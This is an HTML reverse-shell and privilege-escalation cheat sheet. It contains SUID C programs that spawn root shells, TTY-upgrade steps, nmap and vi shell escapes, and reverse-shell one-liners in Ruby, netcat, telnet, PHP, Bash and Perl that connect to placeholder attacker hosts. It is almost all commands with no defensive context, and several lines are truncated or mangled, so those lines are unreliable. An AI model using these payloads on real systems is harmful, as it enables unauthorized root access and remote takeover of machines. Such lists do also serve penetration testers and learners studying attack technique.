
<h1>SUID C Shells </h1>
bin/bash:
<pre><code>int main(void){

setresuid(0, 0, 0);

system("/bin/bash");

}</pre></code>
bin/sh:
<pre><code>int main(void){

setresuid(0, 0, 0);

system("/bin/sh");

}</pre></code>

<h1>TTY Shell</h1>
<pre><code>python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh –i
execute('/bin/sh')
</pre></code>
<code>!sh</code> : Privilege Escalation via nmap<br>
<code>:!bash</code> : Privilege Escalation via vi

<h2>Fully Interactive TTY</h2>
<b>In reverse shell </b>
<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'
<b>Ctrl-Z </b></pre></code>
<b>In Attacker console </b>
<pre><code>stty -a
stty raw -echo
<b>fg </b></pre></code>
<b>In reverse shell </b>
<pre><code>reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols></pre></code>

<h1>Spawn Ruby Shell</h1>
<pre><code>exec "/bin/sh"
ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d
</pre></code>

<h1>Netcat</h1>
<pre><code>nc -e /bin/sh x.x.x.x 80
/bin/sh | nc ATTACKING-IP 80
rm -f /tmp/p; mknod /tmp/p p && nc x.x.x.x 4444 0/tmp/p</pre></code>

<h1>Telnet Reverse Shell</h1>
<pre><code>rm -f /tmp/p; mknod /tmp/p p && telnet x.x.x.x 80 0/tmp/p
telnet x.x.x.x 80 | /bin/bash | telnet x.x.x.x 443</pre></code>

<h1>PHP</h1>
<pre><code>
php -r '$sock=fsockopen("x.x.x.x",80);exec("/bin/sh -i <&3 >&3 2>&3");'</pre></code>

<h1>Bash</h1>
<pre><code>exec /bin/bash 0&0 2>&0
0<&196;exec 196<>/dev/tcp/x.x.x.x/80; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/x.x.x.x/80 cat <&5 | while read line; do $line 2>&5 >&5; done
</pre></code>
# or: while read line 0<&5; do $line 2>&5 >&5; done
<code> bash -i >& /dev/tcp/x.x.x.x/80 0>&1</code>

<h1>Perl</h1>
<pre><code>
exec "/bin/sh";
perl —e 'exec "/bin/sh";'
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' 
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
</pre></code>

<a href="">reference</a>
